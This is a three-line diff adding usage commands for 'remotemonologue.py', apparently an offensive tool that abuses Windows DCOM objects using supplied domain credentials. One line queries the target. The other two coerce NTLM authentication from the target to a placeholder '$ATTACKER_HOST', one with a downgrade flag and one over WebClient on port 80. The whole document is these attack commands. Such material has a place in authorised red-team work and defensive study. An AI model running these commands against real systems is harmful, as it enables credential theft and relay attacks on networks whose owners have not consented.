@@ -1,0 +1,3 @@
+remotemonologue.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" -query
+remotemonologue.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" -dcom {ServerDataCollectorSet,FileSystemImage,UpdateSession} -auth-to "$ATTACKER_HOST" -downgrade
+remotemonologue.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" -dcom {ServerDataCollectorSet,FileSystemImage,UpdateSession} -auth-to "$ATTACKER_HOST"@80 -webclient
